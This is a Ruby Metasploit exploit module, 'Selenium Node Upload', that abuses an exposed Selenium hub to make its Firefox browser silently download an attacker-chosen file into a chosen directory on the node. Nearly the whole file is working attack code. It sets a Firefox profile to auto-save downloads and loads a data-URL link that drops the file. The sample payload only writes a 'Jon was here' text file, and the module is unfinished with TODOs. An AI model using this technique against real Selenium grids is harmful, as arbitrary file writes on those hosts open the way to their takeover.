##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'selenium-webdriver'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Upload',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to upload a file.
        The upload location will create any directories that do not exist. Including dotfile directories.
        This cannot (yet): 1. Overwrite a file. 2. Upload a dotfile.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'        => [[ 'Automatic', { }]],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Privileged'     => false,
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))
  end

  def check
    # For the check command
  end

  def exploit
    url = 'http://selenium-hub.lan:4444/wd/hub'

    # TODO, split local file into path and basename
    remote_path = '/tmp/'
    remote_file = 'jonwashere.txt'

    # TODO, read and store in base64 string
    local_file_contents = 'AEoAbwBuACAAdwBhAHMAIABoAGUAcgBl'

    # Inline html with an inline download file link
    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="data:application/octet-stream;charset=utf-16le;base64,%s" download="%s">f</a></html>' % [local_file_contents, remote_file]

    profile = Selenium::WebDriver::Firefox::Profile.new
    profile['browser.download.folderList'] = 2
    profile['browser.download.manager.showWhenStarting'] = false
    profile['browser.download.dir'] = remote_path
    profile['browser.helperApps.neverAsk.saveToDisk'] = 'application/octet-stream'
    capabilities = Selenium::WebDriver::Remote::Capabilities.firefox(:firefox_profile => profile)
    driver = Selenium::WebDriver.for :remote, :url => url, :desired_capabilities => capabilities

    # Load the data URL and click the download link
    driver.navigate.to(data_url)
    driver.find_element(:id, 'f').click
    driver.quit
  end

end
